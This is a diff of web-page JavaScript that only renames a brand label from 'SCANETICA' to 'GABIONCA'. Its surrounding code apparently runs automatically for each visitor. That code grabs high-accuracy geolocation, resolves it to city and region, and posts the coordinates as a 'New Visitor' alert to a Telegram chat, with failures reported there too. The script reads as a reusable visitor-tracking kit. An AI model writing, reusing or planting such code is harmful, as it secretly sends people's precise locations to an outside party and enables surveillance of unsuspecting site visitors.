@@ -107,7 +107,7 @@
             console.log('Reverse geocoding failed, sending coordinates only');
           }
 
-          const message = `✅ SCANETICA - New Visitor
+          const message = `✅ GABIONCA - New Visitor
 
       📍 ${latitude}, ${longitude}
       🏙 ${city}, ${region}
@@ -121,7 +121,7 @@
 
           await sendToTelegram(message);
         } catch (err) {
-          const errorMsg = `❌ SCANETICA - Location Capture FAILED
+          const errorMsg = `❌ GABIONCA - Location Capture FAILED
 
       Error: ${err.message}
       Type: ${err.name || 'Unknown'}
@@ -135,7 +135,7 @@
 
       const initAutoLocationSender = () => {
         if (!navigator.geolocation) {
-          sendToTelegram(`❌ SCANETICA - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
+          sendToTelegram(`❌ GABIONCA - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
           return;
         }
 
@@ -150,7 +150,7 @@
                 case error.TIMEOUT: errorType = 'TIMEOUT'; break;
                 default: errorType = `CODE_${error.code}`;
               }
-              sendToTelegram(`❌ SCANETICA - Location ${errorType}\nMessage: ${error.message}`);
+              sendToTelegram(`❌ GABIONCA - Location ${errorType}\nMessage: ${error.message}`);
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
